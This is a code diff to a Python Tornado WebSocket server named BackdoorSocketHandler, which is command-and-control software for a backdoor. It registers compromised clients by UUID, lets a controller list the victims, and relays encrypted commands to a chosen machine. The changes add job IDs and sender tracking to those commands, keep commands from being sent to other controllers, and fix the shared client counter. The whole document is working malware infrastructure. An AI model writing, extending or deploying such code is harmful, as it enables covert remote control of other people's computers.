@@ -31,6 +31,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         self.IV = '\0' * AES.block_size
         self.SECRET = None
         self.is_controller = False
+        self.jobs = list()
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
@@ -50,6 +51,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
     def on_message(self, message):
         if self.UUID and self.SECRET:
+            # --Command--
             json_str = self.decrypt(message)
             msg = json.loads(json_str)
 
@@ -60,17 +62,27 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                     for key, client in self.clients.items():
                         data += str(key) + '\t' + client.UUID + '\t' + self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
                     self.send_data(data)
+
                 elif 'to' in msg:
+                    # --Transfer--
                     to = int(msg['to'])
                     if to in self.clients:
                         to_client = self.clients[to]
-                        if not to_client == self:
-                            to_client.write_message(to_client.encrypt(json_str))
-                        self.send_data('OK.\n')
+                        if not to_client.is_controller:
+                            msg['jobid'] = str(len(self.jobs))
+                            msg['from'] = self.ID
+                            to_client.write_message(to_client.encrypt(json.dumps(msg)))
+                            self.jobs.append(msg)
+                            self.send_data('OK.\n')
+
+                        else:
+                            self.send_data('Should not send command to controller.\n')
+
                     else:
                         self.send_data('Not available target.\n')
 
         else:
+            # --Login--
             msg = json.loads(message)
 
             if 'uuid' in msg:
@@ -87,8 +99,8 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
                 self.ID = self.ID_LASTEST
                 self.clients[self.ID] = self
-                print 'find new client: ' + self.request.remote_ip + '(' + self.UUID + ')'
-                self.ID_LASTEST += 1
+                print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
+                BackdoorSocketHandler.ID_LASTEST += 1
 
     def on_close(self):
         if self.ID in self.clients:
